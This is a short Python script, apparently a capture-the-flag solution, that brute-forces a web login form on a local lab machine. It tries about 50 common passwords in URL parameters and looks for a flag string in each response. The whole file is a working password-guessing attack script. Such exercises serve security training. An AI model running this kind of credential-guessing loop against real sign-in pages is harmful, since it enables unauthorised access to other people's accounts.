#! /usr/bin/python3

import requests
import re
from time import sleep


list_50_password = [
'123456'
'123456789'
,'qwerty'
,'password'
,'1234567'
,'12345678'
,'12345'
,'iloveyou'
,'111111'
,'123123'
,'abc123'
,'qwerty123'
,'1q2w3e4r'
,'admin'
,'qwertyuiop'
,'654321'
,'555555'
,'lovely'
,'7777777'
,'888888'
,'princess'
,'dragon'
,'password1'
,'123qwe'
,'666666'
,'1qaz2wsx'
,'333333'
,'michael'
,'sunshine'
,'liverpool'
,'777777'
,'1q2w3e4r5t'
,'donald'
,'freedom'
,'football'
,'charlie'
,'letmein'
,'!@#$ %^ &*'
,'secret'
,'aa123456'
,'987654321'
,'zxcvbnm'
,'passw0rd'
,'bailey'
,'nothing'
,'shadow'
,'121212'
,'biteme'
,'ginger'
]

def main():
    for password in list_50_password :
        print(password)
        url = "http://192.168.56.102/?page=signin&username=usernamerandom&password={}&Login=Login#".format(password)
        try :
            baseReq = requests.get(url)
            html = baseReq.content
            search = re.findall("The flag is : (\w+)", str(html))
            if search :
                print("the flag is :", search[0])
                print("GG You are connected")
                break
        except : pass

if __name__ == "__main__":
    main()
